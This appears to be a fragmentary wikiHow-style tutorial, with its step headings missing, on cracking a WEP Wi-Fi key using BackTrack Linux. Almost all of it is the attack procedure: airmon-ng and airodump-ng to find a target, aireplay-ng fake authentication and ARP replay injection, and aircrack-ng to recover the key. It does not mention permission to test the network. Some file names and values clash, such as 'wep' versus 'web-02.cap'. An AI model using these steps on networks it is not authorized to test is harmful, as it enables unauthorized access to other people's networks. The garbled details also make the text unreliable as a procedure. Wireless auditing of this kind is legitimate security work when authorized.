 Windows cannot sniff WEP packets, but you can use a bootable CD of Linux.;
, Backtrack is a commonly-used option. Download the iso image and burn it on a bootable CD/DVD.
 Use your bootable CD/DVDs.


Note that this operating system is not required to be installed on hard drive. That means whenever you shutdown the Backtrack, all your data will be lost.
 The following Backtrack screen will show after booting. Change the option with the up and down arrow keys and select one. This tutorial will use the first option.
 In this option, Backtrack is started on command base. Type command: startx to continue.
 It'll be the fifth option.
, Enter the following command: "airmon-ng" (without quotes). You should see something like wlan0 beneath Interface.
 Enter the following command: "airodump-ng wlan0" (without quotes). You should get three things:


BSSID
Channel
ESSID (AP Name)
Here's what the tutorial case turned up:

BSSID 00:17:3F:76:36:6E
Channel number 1
ESSID(AP Name)Suleman



, This one will use the example information above, but you should plug in your own. Command: "airodump-ng -w wep -c 1 -- bssid 00:17:3F:76:36:6E wlan0" (without quotes).
, Type the following command, substituting the values for your own BSSID, Channel and ESSID. Command: "aireplay-ng -1 0 –a 00:17:3f:76:36:6E wlan0" (without quotes).
 Type the following command: "aireplay-ng -3 –b 00:17:3f:76:36:6e wlan0" (without quotes).
,, It will take 15 to 60 minutes (or more) depending on wireless signal, hardware and load on access point.
, Type the following command: "dir" (without quotes). This will show the directories saved on it during decrypting.
 For the example, it would be the following: "aircrack-ng web-02.cap" (without quotes). The setup shown below will start.
 After this setup completes, you'll be able to break the key. In this example, it was {ADA2D18D2E}.
